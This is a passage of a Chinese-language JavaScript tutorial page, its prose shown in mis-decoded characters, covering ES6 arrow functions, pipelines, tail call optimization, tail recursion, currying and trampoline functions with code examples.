ä¸º<code>button</code>çš„ç›‘å¬å‡½æ•°æ˜¯ä¸€ä¸ªç®­å¤´å‡½æ•°ï¼Œå¯¼è‡´é‡Œé¢çš„<code>this</code>å°±æ˜¯å…¨å±€å¯¹è±¡ã€‚å¦‚æœæ”¹æˆæ™®é€šå‡½æ•°ï¼Œ<code>this</code>å°±ä¼šåŠ¨æ€æŒ‡å‘è¢«ç‚¹å‡»çš„æŒ‰é’®å¯¹è±¡ã€‚</p><h3 id="åµŒå¥—çš„ç®­å¤´å‡½æ•°"><a href="#åµŒå¥—çš„ç®­å¤´å‡½æ•°" class="headerlink" title="åµŒå¥—çš„ç®­å¤´å‡½æ•°"></a>åµŒå¥—çš„ç®­å¤´å‡½æ•°</h3><p>ES5 è¯­æ³•çš„å¤šé‡åµŒå¥—å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">into</span>: <span class="function"><span class="keyword">function</span> (<span class="params">array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">after</span>: <span class="function"><span class="keyword">function</span> (<span class="params">afterValue</span>) </span>&#123;</span><br><span class="line">      array.splice(array.indexOf(afterValue) + <span class="number">1</span>, <span class="number">0</span>, value);</span><br><span class="line">      <span class="keyword">return</span> array;</span><br><span class="line">    &#125;&#125;;</span><br><span class="line">  &#125;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">insert(<span class="number">2</span>).into([<span class="number">1</span>, <span class="number">3</span>]).after(<span class="number">1</span>); <span class="comment">//[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ç®­å¤´å‡½æ•°æ”¹å†™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> insert = <span class="function">(<span class="params">value</span>) =&gt;</span> (&#123;<span class="attr">into</span>: <span class="function">(<span class="params">array</span>) =&gt;</span> (&#123;<span class="attr">after</span>: <span class="function">(<span class="params">afterValue</span>) =&gt;</span> &#123;</span><br><span class="line">  array.splice(array.indexOf(afterValue) + <span class="number">1</span>, <span class="number">0</span>, value);</span><br><span class="line">  <span class="keyword">return</span> array;</span><br><span class="line">&#125;&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">insert(<span class="number">2</span>).into([<span class="number">1</span>, <span class="number">3</span>]).after(<span class="number">1</span>); <span class="comment">//[1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä¸€ä¸ªéƒ¨ç½²ç®¡é“æœºåˆ¶ï¼ˆpipelineï¼‰çš„ä¾‹å­ï¼Œå³å‰ä¸€ä¸ªå‡½æ•°çš„è¾“å‡ºæ˜¯åä¸€ä¸ªå‡½æ•°çš„è¾“å…¥ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pipeline = <span class="function">(<span class="params">...funcs</span>) =&gt;</span></span><br><span class="line">  <span class="function"><span class="params">val</span> =&gt;</span> funcs.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> b(a), val);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> plus1 = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> mult2 = <span class="function"><span class="params">a</span> =&gt;</span> a * <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> addThenMult = pipeline(plus1, mult2);</span><br><span class="line"></span><br><span class="line">addThenMult(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></table></figure><p>å¦‚æœè§‰å¾—ä¸Šé¢çš„å†™æ³•å¯è¯»æ€§æ¯”è¾ƒå·®ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨ä¸‹é¢çš„å†™æ³•ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> plus1 = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> mult2 = <span class="function"><span class="params">a</span> =&gt;</span> a * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">mult2(plus1(<span class="number">5</span>))</span><br><span class="line"><span class="comment">// 12</span></span><br></pre></td></tr></table></figure><h2 id="6ã€å°¾è°ƒç”¨ä¼˜åŒ–"><a href="#6ã€å°¾è°ƒç”¨ä¼˜åŒ–" class="headerlink" title="6ã€å°¾è°ƒç”¨ä¼˜åŒ–"></a>6ã€å°¾è°ƒç”¨ä¼˜åŒ–</h2><h3 id="ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯å°¾è°ƒç”¨ï¼Ÿ</h3><p>å°¾è°ƒç”¨ï¼ˆTail Callï¼‰å°±æ˜¯æŒ‡æŸä¸ªå‡½æ•°çš„æœ€åä¸€æ­¥æ˜¯<strong>è°ƒç”¨</strong>å¦ä¸€ä¸ªå‡½æ•°ã€‚ï¼ˆä¸”è¦è¿”å›ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°¾è°ƒç”¨ä¸ä¸€å®šå‡ºç°åœ¨å‡½æ•°å°¾éƒ¨ï¼Œåªè¦æ˜¯æœ€åä¸€æ­¥æ“ä½œå³å¯ã€‚</p><h3 id="å°¾è°ƒç”¨ä¼˜åŒ–"><a href="#å°¾è°ƒç”¨ä¼˜åŒ–" class="headerlink" title="å°¾è°ƒç”¨ä¼˜åŒ–"></a>å°¾è°ƒç”¨ä¼˜åŒ–</h3><p>å‡½æ•°è°ƒç”¨ä¼šåœ¨å†…å­˜å½¢æˆä¸€ä¸ªâ€œè°ƒç”¨è®°å½•â€ï¼Œåˆç§°â€œè°ƒç”¨å¸§â€ï¼ˆcall frameï¼‰ï¼Œä¿å­˜è°ƒç”¨ä½ç½®å’Œå†…éƒ¨å˜é‡ç­‰ä¿¡æ¯ã€‚å¦‚æœåœ¨å‡½æ•°<code>A</code>çš„å†…éƒ¨è°ƒç”¨å‡½æ•°<code>B</code>ï¼Œé‚£ä¹ˆåœ¨<code>A</code>çš„è°ƒç”¨å¸§ä¸Šæ–¹ï¼Œè¿˜ä¼šå½¢æˆä¸€ä¸ª<code>B</code>çš„è°ƒç”¨å¸§ã€‚ç­‰åˆ°<code>B</code>è¿è¡Œç»“æŸï¼Œå°†ç»“æœè¿”å›åˆ°<code>A</code>ï¼Œ<code>B</code>çš„è°ƒç”¨å¸§æ‰ä¼šæ¶ˆå¤±ã€‚å¦‚æœå‡½æ•°<code>B</code>å†…éƒ¨è¿˜è°ƒç”¨å‡½æ•°<code>C</code>ï¼Œé‚£å°±è¿˜æœ‰ä¸€ä¸ª<code>C</code>çš„è°ƒç”¨å¸§ï¼Œä»¥æ­¤ç±»æ¨ã€‚æ‰€æœ‰çš„è°ƒç”¨å¸§ï¼Œå°±å½¢æˆä¸€ä¸ªâ€œè°ƒç”¨æ ˆâ€ï¼ˆcall stackï¼‰ã€‚</p><p>å°¾è°ƒç”¨ç”±äºæ˜¯å‡½æ•°çš„æœ€åä¸€æ­¥æ“ä½œï¼Œæ‰€ä»¥ä¸éœ€è¦ä¿ç•™å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå› ä¸ºè°ƒç”¨ä½ç½®ã€å†…éƒ¨å˜é‡ç­‰ä¿¡æ¯éƒ½ä¸ä¼šå†ç”¨åˆ°äº†ï¼Œåªè¦ç›´æ¥ç”¨å†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå–ä»£å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§å°±å¯ä»¥äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> m = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">let</span> n = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> g(m + n);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> g(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">f();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">g(<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœå‡½æ•°<code>g</code>ä¸æ˜¯å°¾è°ƒç”¨ï¼Œå‡½æ•°<code>f</code>å°±éœ€è¦ä¿å­˜å†…éƒ¨å˜é‡<code>m</code>å’Œ<code>n</code>çš„å€¼ã€<code>g</code>çš„è°ƒç”¨ä½ç½®ç­‰ä¿¡æ¯ã€‚ä½†ç”±äºè°ƒç”¨<code>g</code>ä¹‹åï¼Œå‡½æ•°<code>f</code>å°±ç»“æŸäº†ï¼Œæ‰€ä»¥æ‰§è¡Œåˆ°æœ€åä¸€æ­¥ï¼Œå®Œå…¨å¯ä»¥åˆ é™¤<code>f(x)</code>çš„è°ƒç”¨å¸§ï¼Œåªä¿ç•™<code>g(3)</code>çš„è°ƒç”¨å¸§ã€‚</p><p>è¿™å°±å«åšâ€œå°¾è°ƒç”¨ä¼˜åŒ–â€ï¼ˆTail call optimizationï¼‰ï¼Œå³<strong>åªä¿ç•™å†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§</strong>ã€‚å¦‚æœæ‰€æœ‰å‡½æ•°éƒ½æ˜¯å°¾è°ƒç”¨ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥åšåˆ°æ¯æ¬¡æ‰§è¡Œæ—¶ï¼Œè°ƒç”¨å¸§åªæœ‰ä¸€é¡¹ï¼Œè¿™å°†å¤§å¤§èŠ‚çœå†…å­˜ã€‚</p><p>æ³¨æ„ï¼Œåªæœ‰ä¸å†ç”¨åˆ°å¤–å±‚å‡½æ•°çš„å†…éƒ¨å˜é‡ï¼Œå†…å±‚å‡½æ•°çš„è°ƒç”¨å¸§æ‰ä¼šå–ä»£å¤–å±‚å‡½æ•°çš„è°ƒç”¨å¸§ï¼Œå¦åˆ™å°±æ— æ³•è¿›è¡Œâ€œå°¾è°ƒç”¨ä¼˜åŒ–â€ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addOne</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> one = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">inner</span>(<span class="params">b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b + one;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> inner(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‡½æ•°ä¸ä¼šè¿›è¡Œå°¾è°ƒç”¨ä¼˜åŒ–ï¼Œå› ä¸ºå†…å±‚å‡½æ•°<code>inner</code>ç”¨åˆ°äº†å¤–å±‚å‡½æ•°<code>addOne</code>çš„å†…éƒ¨å˜é‡<code>one</code>ã€‚</p><p>ä½†ç›®å‰åªæœ‰ Safari æµè§ˆå™¨æ”¯æŒå°¾è°ƒç”¨ä¼˜åŒ–ï¼ŒChrome å’Œ Firefox éƒ½ä¸æ”¯æŒã€‚</p><h3 id="å°¾é€’å½’"><a href="#å°¾é€’å½’" class="headerlink" title="å°¾é€’å½’"></a>å°¾é€’å½’</h3><p>å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œç§°ä¸ºé€’å½’ã€‚å¦‚æœå°¾è°ƒç”¨è‡ªèº«ï¼Œå°±ç§°ä¸ºå°¾é€’å½’ã€‚å¯¹äºå°¾é€’å½’æ¥è¯´ï¼Œç”±äºåªå­˜åœ¨ä¸€ä¸ªè°ƒç”¨å¸§ï¼Œæ‰€ä»¥æ°¸è¿œä¸ä¼šå‘ç”Ÿâ€œæ ˆæº¢å‡ºâ€ï¼ˆstack overflowï¼‰é”™è¯¯ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> n * factorial(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ˜¯ä¸€ä¸ªé˜¶ä¹˜å‡½æ•°ï¼Œè®¡ç®—<code>n</code>çš„é˜¶ä¹˜ï¼Œæœ€å¤šéœ€è¦ä¿å­˜<code>n</code>ä¸ªè°ƒç”¨è®°å½•ï¼Œå¤æ‚åº¦ O(n) ã€‚å¦‚æœæ”¹å†™æˆå°¾é€’å½’ï¼Œåªä¿ç•™ä¸€ä¸ªè°ƒç”¨è®°å½•ï¼Œå¤æ‚åº¦ O(1) ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>, <span class="number">1</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>éå°¾é€’å½’çš„ Fibonacci æ•°åˆ—å®ç°å¦‚ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fibonacci</span> (<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">1</span> ) &#123;<span class="keyword">return</span> <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Fibonacci(n - <span class="number">1</span>) + Fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fibonacci(<span class="number">10</span>) <span class="comment">// 89</span></span><br><span class="line">Fibonacci(<span class="number">100</span>) <span class="comment">// è¶…æ—¶</span></span><br><span class="line">Fibonacci(<span class="number">500</span>) <span class="comment">// è¶…æ—¶</span></span><br></pre></td></tr></table></figure><p>å°¾é€’å½’ä¼˜åŒ–è¿‡çš„ Fibonacci æ•°åˆ—å®ç°å¦‚ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fibonacci2</span> (<span class="params">n , ac1 = <span class="number">1</span> , ac2 = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>( n &lt;= <span class="number">1</span> ) &#123;<span class="keyword">return</span> ac2&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> Fibonacci2 (n - <span class="number">1</span>, ac2, ac1 + ac2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fibonacci2(<span class="number">100</span>) <span class="comment">// 573147844013817200000</span></span><br><span class="line">Fibonacci2(<span class="number">1000</span>) <span class="comment">// 7.0330367711422765e+208</span></span><br><span class="line">Fibonacci2(<span class="number">10000</span>) <span class="comment">// Infinity</span></span><br></pre></td></tr></table></figure><h3 id="é€’å½’å‡½æ•°çš„æ”¹å†™"><a href="#é€’å½’å‡½æ•°çš„æ”¹å†™" class="headerlink" title="é€’å½’å‡½æ•°çš„æ”¹å†™"></a>é€’å½’å‡½æ•°çš„æ”¹å†™</h3><p>ä¸Šé¢çš„ä¾‹å­ï¼Œé˜¶ä¹˜å‡½æ•° factorial éœ€è¦ç”¨åˆ°ä¸€ä¸ªä¸­é—´å˜é‡<code>total</code>ï¼Œé‚£å°±æŠŠè¿™ä¸ªä¸­é—´å˜é‡æ”¹å†™æˆå‡½æ•°çš„å‚æ•°ã€‚è¿™æ ·åšçš„ç¼ºç‚¹å°±æ˜¯ä¸å¤ªç›´è§‚ï¼Œç¬¬ä¸€çœ¼å¾ˆéš¾çœ‹å‡ºæ¥ï¼Œä¸ºä»€ä¹ˆè®¡ç®—<code>5</code>çš„é˜¶ä¹˜ï¼Œéœ€è¦ä¼ å…¥ä¸¤ä¸ªå‚æ•°<code>5</code>å’Œ<code>1</code>ï¼Ÿ</p><p>ä¸¤ä¸ªæ–¹æ³•å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æ–¹æ³•ä¸€æ˜¯åœ¨å°¾é€’å½’å‡½æ•°ä¹‹å¤–ï¼Œå†æä¾›ä¸€ä¸ªæ­£å¸¸å½¢å¼çš„å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tailFactorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>å‡½æ•°å¼ç¼–ç¨‹æœ‰ä¸€ä¸ªæ¦‚å¿µï¼Œå«åšæŸ¯é‡ŒåŒ–ï¼ˆcurryingï¼‰ï¼Œæ„æ€æ˜¯å°†å¤šå‚æ•°çš„å‡½æ•°è½¬æ¢æˆå•å‚æ•°çš„å½¢å¼ã€‚è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨æŸ¯é‡ŒåŒ–ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">currying</span>(<span class="params">fn, n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">m</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fn.call(<span class="built_in">this</span>, m, n);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tailFactorial</span>(<span class="params">n, total</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> tailFactorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> factorial = currying(tailFactorial, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æ–¹æ³•å°±ç®€å•å¤šäº†ï¼Œå°±æ˜¯é‡‡ç”¨ ES6 çš„å‡½æ•°é»˜è®¤å€¼ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">n, total = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n === <span class="number">1</span>) <span class="keyword">return</span> total;</span><br><span class="line">  <span class="keyword">return</span> factorial(n - <span class="number">1</span>, n * total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">5</span>) <span class="comment">// 120</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‚æ•°<code>total</code>æœ‰é»˜è®¤å€¼<code>1</code>ï¼Œæ‰€ä»¥è°ƒç”¨æ—¶ä¸ç”¨æä¾›è¿™ä¸ªå€¼ã€‚</p><h3 id="ä¸¥æ ¼æ¨¡å¼"><a href="#ä¸¥æ ¼æ¨¡å¼" class="headerlink" title="ä¸¥æ ¼æ¨¡å¼"></a>ä¸¥æ ¼æ¨¡å¼</h3><p>ES6 çš„å°¾è°ƒç”¨ä¼˜åŒ–åªåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹å¼€å¯ï¼Œæ­£å¸¸æ¨¡å¼æ˜¯æ— æ•ˆçš„ã€‚è¿™æ˜¯å› ä¸ºåœ¨æ­£å¸¸æ¨¡å¼ä¸‹ï¼Œå‡½æ•°å†…éƒ¨æœ‰ä¸¤ä¸ªå˜é‡ï¼Œå¯ä»¥è·Ÿè¸ªå‡½æ•°çš„è°ƒç”¨æ ˆã€‚</p><ul><li><code>func.arguments</code>ï¼šè¿”å›è°ƒç”¨æ—¶å‡½æ•°çš„å‚æ•°ã€‚</li><li><code>func.caller</code>ï¼šè¿”å›è°ƒç”¨å½“å‰å‡½æ•°çš„é‚£ä¸ªå‡½æ•°ã€‚</li></ul><p>å°¾è°ƒç”¨ä¼˜åŒ–å‘ç”Ÿæ—¶ï¼Œå‡½æ•°çš„è°ƒç”¨æ ˆä¼šæ”¹å†™ï¼Œå› æ­¤ä¸Šé¢ä¸¤ä¸ªå˜é‡å°±ä¼šå¤±çœŸã€‚ä¸¥æ ¼æ¨¡å¼ç¦ç”¨è¿™ä¸¤ä¸ªå˜é‡ï¼Œæ‰€ä»¥å°¾è°ƒç”¨æ¨¡å¼ä»…åœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹ç”Ÿæ•ˆã€‚</p><h3 id="å°¾é€’å½’ä¼˜åŒ–çš„å®ç°"><a href="#å°¾é€’å½’ä¼˜åŒ–çš„å®ç°" class="headerlink" title="*å°¾é€’å½’ä¼˜åŒ–çš„å®ç°"></a>*å°¾é€’å½’ä¼˜åŒ–çš„å®ç°</h3><p>æ­£å¸¸æ¨¡å¼ä¸‹ï¼Œæˆ–è€…é‚£äº›ä¸æ”¯æŒè¯¥åŠŸèƒ½çš„ç¯å¢ƒä¸­ï¼Œæœ‰æ²¡æœ‰åŠæ³•ä¹Ÿä½¿ç”¨å°¾é€’å½’ä¼˜åŒ–å‘¢ï¼Ÿç­”ï¼šè‡ªå·±å®ç°å°¾é€’å½’ä¼˜åŒ–ã€‚</p><p>å°¾é€’å½’ä¹‹æ‰€ä»¥éœ€è¦ä¼˜åŒ–ï¼ŒåŸå› æ˜¯è°ƒç”¨æ ˆå¤ªå¤šï¼Œé€ æˆæº¢å‡ºï¼Œé‚£ä¹ˆåªè¦å‡å°‘è°ƒç”¨æ ˆï¼Œå°±ä¸ä¼šæº¢å‡ºã€‚æ€ä¹ˆåšå¯ä»¥å‡å°‘è°ƒç”¨æ ˆå‘¢ï¼Ÿå°±æ˜¯<strong>é‡‡ç”¨â€œå¾ªç¯â€æ¢æ‰â€œé€’å½’â€</strong>ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ­£å¸¸çš„é€’å½’å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sum(<span class="number">1</span>, <span class="number">100000</span>)</span><br><span class="line"><span class="comment">// Uncaught RangeError: Maximum call stack size exceeded(â€¦)</span></span><br></pre></td></tr></table></figure><p>å¼•å…¥ï¼šè¹¦åºŠå‡½æ•°ï¼ˆtrampolineï¼‰å¯ä»¥å°†é€’å½’æ‰§è¡Œè½¬ä¸ºå¾ªç¯æ‰§è¡Œã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trampoline</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (f &amp;&amp; f <span class="keyword">instanceof</span> <span class="built_in">Function</span>) &#123;</span><br><span class="line">    f = f();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å°±æ˜¯è¹¦åºŠå‡½æ•°çš„ä¸€ä¸ªå®ç°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‡½æ•°<code>f</code>ä½œä¸ºå‚æ•°ã€‚åªè¦<code>f</code>æ‰§è¡Œåè¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œå°±ç»§ç»­æ‰§è¡Œã€‚æ³¨æ„ï¼Œè¿™é‡Œæ˜¯è¿”å›ä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæ‰§è¡Œè¯¥å‡½æ•°ï¼Œè€Œä¸æ˜¯å‡½æ•°é‡Œé¢è°ƒç”¨å‡½æ•°ï¼Œè¿™æ ·å°±é¿å…äº†é€’å½’æ‰§è¡Œï¼Œä»è€Œå°±æ¶ˆé™¤äº†è°ƒç”¨æ ˆè¿‡å¤§çš„é—®é¢˜ã€‚ç„¶åï¼Œè¦åšçš„å°±æ˜¯å°†åŸæ¥çš„é€’å½’å‡½æ•°ï¼Œæ”¹å†™ä¸ºæ¯ä¸€æ­¥è¿”å›å¦ä¸€ä¸ªå‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum.bind(<span class="literal">null</span>, x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>sum</code>å‡½æ•°çš„æ¯æ¬¡æ‰§è¡Œï¼Œéƒ½ä¼šè¿”å›è‡ªèº«çš„å¦ä¸€ä¸ªç‰ˆæœ¬ã€‚ç°åœ¨ï¼Œä½¿ç”¨è¹¦åºŠå‡½æ•°æ‰§è¡Œ<code>sum</code>ï¼Œå°±ä¸ä¼šå‘ç”Ÿè°ƒç”¨æ ˆæº¢å‡ºã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">trampoline(sum(<span class="number">1</span>, <span class="number">100000</span>))</span><br><span class="line"><span class="comment">// 100001</span></span><br></pre></td></tr></table></figure><p>è¹¦åºŠå‡½æ•°å¹¶ä¸æ˜¯çœŸæ­£çš„å°¾é€’å½’ä¼˜åŒ–ï¼Œä¸‹é¢çš„å®ç°æ‰æ˜¯ã€‚ï¼ˆæœ‰ç‚¹éš¾ï¼Œæš‚æ—¶çœ‹ä¸æ‡‚ï¼‰</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tco</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> value;</span><br><span class="line">  <span class="keyword">var</span> active = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">var</span> accumulated = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">accumulator</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    accumulated.push(<span class="built_in">arguments</span>);</span><br><span class="line">    <span class="keyword">if</span> (!active) &#123;</span><br><span class="line">      active = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">while</span> (accumulated.length) &#123;</span><br><span class="line">        value = f.apply(<span class="built_in">this</span>, accumulated.shift());</span><br><span class="line">      &#125;</span><br><span class="line">      active = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = tco(<span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum(x + <span class="number">1</span>, y - <span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> 